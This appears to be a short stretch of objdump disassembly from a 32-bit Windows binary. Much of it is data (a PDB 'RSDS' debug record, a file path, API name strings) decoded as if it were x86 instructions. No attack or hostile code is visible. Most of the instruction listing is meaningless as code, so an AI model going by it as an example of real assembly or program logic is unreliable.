  420f8d:	cmovb  eax,DWORD PTR [eax]
  420f90:	add    al,0xf
  420f92:	inc    edx
  420f93:	add    BYTE PTR [eax],cl
  420f95:	cmovb  eax,DWORD PTR [eax]
  420f98:	adc    DWORD PTR [ebp+0x10],ebx
  420f9b:	add    bh,cl
  420f9d:	push   es
  420f9e:	adc    BYTE PTR [eax],al
  420fa0:	xchg   esp,eax
  420fa1:	xor    eax,0x7b780010
  420fa6:	adc    BYTE PTR [eax],al
  420fa8:	stos   BYTE PTR es:[edi],al
  420fa9:	jo     0x420fbb
  420fab:	add    BYTE PTR [eax],ch
  420fad:	inc    esp
  420fae:	adc    BYTE PTR [eax],al
  420fb0:	pop    ebp
  420fb1:	pop    ecx
  420fb2:	adc    BYTE PTR [eax],al
  420fb4:	fild   QWORD PTR [edi]
  420fb6:	adc    BYTE PTR [eax],al
	...
  420fc0:	push   edx
  420fc1:	push   ebx
  420fc2:	inc    esp
  420fc3:	push   ebx
  420fc4:	mov    BYTE PTR [eax+0x76],cl
  420fc7:	fisttp DWORD PTR [edx-0x65b8c401]
  420fcd:	inc    ecx
  420fce:	mov    dl,0x7e
  420fd0:	jecxz  0x420ffd
  420fd2:	adc    eax,0x193
  420fd7:	add    BYTE PTR [ebx+0x3a],al
  420fda:	pop    esp
  420fdb:	inc    ebx
  420fdc:	jne    0x421050
  420fde:	jb     0x421045
  420fe0:	outs   dx,BYTE PTR ds:[esi]
  420fe1:	je     0x421027
  420fe3:	popa   
  420fe4:	je     0x421047
  420fe6:	pop    esp
  420fe7:	dec    ebp
  420fe8:	outs   dx,DWORD PTR ds:[esi]
  420fe9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  420ff1:	ins    BYTE PTR es:[edi],dx
  420ff2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  420ff9:	dec    esi
  420ffa:	gs ja  0x420ffd
  420ffd:	add    BYTE PTR [eax],al
  420fff:	add    BYTE PTR [eax],al
  421001:	add    BYTE PTR [eax],al
  421003:	add    BYTE PTR [edx-0x2c],cl
  421006:	mov    bl,0x4d
  421008:	add    BYTE PTR [eax],al
  42100a:	add    BYTE PTR [eax],al
  42100c:	xor    dl,BYTE PTR [eax]
  42100e:	add    al,BYTE PTR [eax]
  421010:	add    DWORD PTR [eax],eax
  421012:	add    BYTE PTR [eax],al
  421014:	add    DWORD PTR [eax],eax
  421016:	add    BYTE PTR [eax],al
  421018:	add    DWORD PTR [eax],eax
  42101a:	add    BYTE PTR [eax],al
  42101c:	sub    BYTE PTR [eax],dl
  42101e:	add    al,BYTE PTR [eax]
  421020:	sub    al,0x10
  421022:	add    al,BYTE PTR [eax]
  421024:	xor    BYTE PTR [eax],dl
  421026:	add    al,BYTE PTR [eax]
  421028:	mov    edi,0x3e000020
  42102d:	adc    BYTE PTR [edx],al
  42102f:	add    BYTE PTR [eax],al
  421031:	add    BYTE PTR [ebx+0x79],dl
  421034:	ins    DWORD PTR es:[edi],dx
  421035:	bound  ebp,QWORD PTR [edi+0x6c]
  421038:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  42103f:	inc    ebx
  421040:	ins    BYTE PTR es:[edi],dx
  421041:	outs   dx,DWORD PTR ds:[esi]
  421042:	jae    0x4210a9
  421044:	push   edi
  421045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42104c:	popa   
  42104d:	je     0x4210b8
  42104f:	outs   dx,DWORD PTR ds:[esi]
  421050:	outs   dx,BYTE PTR ds:[esi]
  421051:	inc    ebx
  421052:	ins    BYTE PTR es:[edi],dx
  421053:	outs   dx,DWORD PTR ds:[esi]
  421054:	jae    0x4210bb
  421056:	push   edi
  421057:	.byte 0x69
